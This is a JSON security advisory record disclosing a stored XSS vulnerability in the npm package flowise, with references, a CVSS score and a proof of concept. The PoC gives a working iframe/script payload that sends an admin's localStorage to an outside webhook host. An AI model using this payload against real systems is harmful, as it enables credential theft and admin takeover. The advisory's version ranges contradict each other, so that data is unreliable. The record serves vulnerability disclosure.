{
  "Severity": "CRITICAL",
  "UpdatedAt": "2025-10-13T17:38:23Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "flowise"
  },
  "Advisory": {
    "DatabaseId": 315104,
    "Id": "GSA_kwCzR0hTQS05NjRwLWo0Z2ctbWh3Y84ABM7g",
    "GhsaId": "GHSA-964p-j4gg-mhwc",
    "References": [
      {
        "Url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-964p-j4gg-mhwc"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-50538"
      },
      {
        "Url": "https://github.com/FlowiseAI/Flowise/pull/4905"
      },
      {
        "Url": "https://github.com/FlowiseAI/Flowise/commit/9a06a85a8ddcbaeca1342827a5fea9087a587d97"
      },
      {
        "Url": "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.5"
      },
      {
        "Url": "https://github.com/advisories/GHSA-964p-j4gg-mhwc"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-964p-j4gg-mhwc"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-50538"
      }
    ],
    "Description": "### Summary\nA stored Cross-Site Scripting (XSS) vulnerability in FlowiseAI allows a user to inject arbitrary JavaScript code via message input. When an administrator views messages using the \"View Messages\" button in the workflow UI, the malicious script executes in the context of the adminâ€™s browser, enabling credential theft via access to `localStorage`.\n\n---\n\n### Details\nThe vulnerability stems from a lack of input sanitization when displaying stored user messages in the admin interface. A specially crafted payload using `\u003ciframe srcdoc=\"...\"\u003e` can include arbitrary JavaScript, which is executed when the message is rendered.\n\n---\n\n### PoC\n1. Deploy a FlowiseAI agent and make it accessible via browser (e.g., embed on a website).\n2. Send the following payload via the agent's chat interface:\n   ```html\n   \u003ciframe srcdoc=\"\u003cscript\u003efetch('http://requestbin.whapi.cloud/XXXXX?d='+encodeURIComponent(JSON.stringify(localStorage)))\u003c/script\u003e\"\u003e\n   ```\n3. As an admin, go to the workflow and click **\"View Messages\"**.\n4. The JavaScript is executed in the admin's browser, exfiltrating `localStorage` content to the attacker-controlled webhook endpoint.\n\n---\n\n### Impact\n- **Type:** Stored Cross-Site Scripting (XSS)\n- **Who is impacted:** Any admin viewing messages in the FlowiseAI UI\n- **Data at risk:** Admin credentials, or sensitive info stored in `localStorage`\n- **Severity:** High (Account takeover, admin privilege escalation, full panel compromise)\n\n---\n\n### Affected Products\n- **Ecosystem:** `npm`\n- **Package name:** `flowise`\n- **Affected versions:** `\u003c 2.2.7`\n- **Patched versions:**`1`",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-10-03T21:47:37Z",
    "Severity": "CRITICAL",
    "Summary": "Flowise is vulnerable to stored XSS via \"View Messages\" allows credential theft in FlowiseAI admin panel",
    "UpdatedAt": "2025-10-13T17:38:23Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 9.3,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.0.8"
      },
      "VulnerableVersionRange": "\u003c 3.0.8"
    }
  ]
}